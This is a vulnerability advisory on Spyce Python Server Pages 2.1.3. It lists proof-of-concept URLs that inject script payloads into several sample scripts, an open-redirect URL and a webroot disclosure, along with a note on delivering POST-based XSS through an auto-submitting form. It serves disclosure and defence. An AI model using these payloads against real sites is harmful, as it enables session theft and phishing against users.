PR08-01: Several XSS, a cross-domain redirect and a webroot disclosure 
on Spyce - Python Server Pages (PSP)

Vulnerability found: 19th December 2007

Vendor informed: 14th January 2007

Vulnerability fixed: the vendor did not respond, however a workaround 
has been included in the "Fix" section of this advisory.

Severity: Medium

Description:

All Spyce sample scripts that return client-supplied input back to the 
browser are vulnerable to XSS. It is also possible to redirect users to 
third-party sites and obtain the webroot path by not submitting required 
parameters to certain scripts.


Note: tested on Spyce - Python Server Pages version 2.1.3


The following are only some examples that demonstrate XSS:

http://domain.foo/docs/examples/redirect.spy?url=%3CSCRIPT%3Ealert('Can%20Cross%20Site%20Attack')%3C/SCRIPT%3E&type=internal
http://domain.foo/docs/examples/handlervalidate.spy?x="><SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
http://domain.foo/spyce/examples/request.spy?name="/><SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
http://domain.foo/spyce/examples/getpost.spy?Name="/><SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
http://domain.foo/spyce/examples/formtag.spy?="/><SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>&foo=Submit!&mycheck=check1&mypass=secret&myradio=radio_option1&mytext=some&mytextarea=</textarea><SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
http://domain.foo/spyce/examples/formtag.spy?mypass=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E


Other vulnerable scripts and unsanitized parameters:

Script: /demos/chat/
parameter: newline

Script: /docs/examples/formintro.spy
parameter: text1

Script: /docs/examples/formtag.spy
parameter: mytext
parameter: mydate

Script: /docs/examples/redirect.spy
parameter: type


Note: some XSS can only be exploited via POST requests (as opposed to 
GET). This could be done by using an embedded HTML form with 
"method='POST'" attribute and a JavaScript snippet that causes the form 
to auto-submits itself. Such form would be located on a third-party site.


Cross-domain redirect PoC:

http://domain.foo/spyce/examples/redirect.spy?url=www.procheckup.com&type=external


Requesting the following URL returns the server's webroot:

http://domain.foo/spyce/examples/automaton.spy


Consequences:

An attacker may be able to cause execution of malicious scripting code 
in the browser of a user who clicks on a link to a Spyce-based site. 
Such code would run within the security context of the target domain. 
This type of attack can result in non-persistent defacement of the 
target site, or the redirection of confidential information (i.e.: 
session IDs) to unauthorised third parties.

Attackers can redirect victim users to third-party sites. Such behaviour 
can help attackers perform phishing attacks by redirecting the victim to 
a spoof login page.


Fix:

Remove sample scripts from live environments.
